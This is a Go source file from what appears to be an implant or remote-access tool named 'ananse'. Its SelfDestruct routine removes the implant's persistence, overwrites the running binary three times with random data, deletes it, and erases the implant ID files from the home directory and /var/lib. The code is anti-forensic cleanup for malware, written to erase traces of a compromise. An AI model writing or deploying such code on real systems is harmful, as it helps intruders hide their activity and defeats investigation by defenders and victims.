package watchdog

import (
	"fmt"
	"math/rand"
	"os"
	"time"
)

// SelfDestruct performs full implant removal.
func SelfDestruct() error {
	fmt.Println("[ananse] self-destruct initiated")

	// 1. Remove persistence
	if err := Remove(); err != nil {
		fmt.Fprintf(os.Stderr, "remove persistence: %v\n", err)
	}

	// 2. Wipe and remove binary
	if err := WipeBinary(); err != nil {
		fmt.Fprintf(os.Stderr, "wipe binary: %v\n", err)
	}

	// 3. Clean up implant ID file
	_ = os.Remove(os.ExpandEnv("${HOME}/.ananse/id"))
	_ = os.Remove("/var/lib/ananse/id")

	fmt.Println("[ananse] self-destruct complete")
	return nil
}

// WipeBinary overwrites the running binary with random data and deletes it.
func WipeBinary() error {
	path, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}

	info, err := os.Stat(path)
	if err != nil {
		return err
	}
	size := info.Size()

	// Overwrite with random data in 3 passes
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for pass := 0; pass < 3; pass++ {
		f, err := os.OpenFile(path, os.O_WRONLY, 0)
		if err != nil {
			return fmt.Errorf("open for wipe pass %d: %w", pass, err)
		}
		buf := make([]byte, 4096)
		for written := int64(0); written < size; written += int64(len(buf)) {
			if size-written < int64(len(buf)) {
				buf = buf[:size-written]
			}
			rng.Read(buf)
			_, _ = f.WriteAt(buf, written)
		}
		f.Close()
	}

	// Remove the binary
	if err := os.Remove(path); err != nil {
		return fmt.Errorf("remove binary: %w", err)
	}
	return nil
}
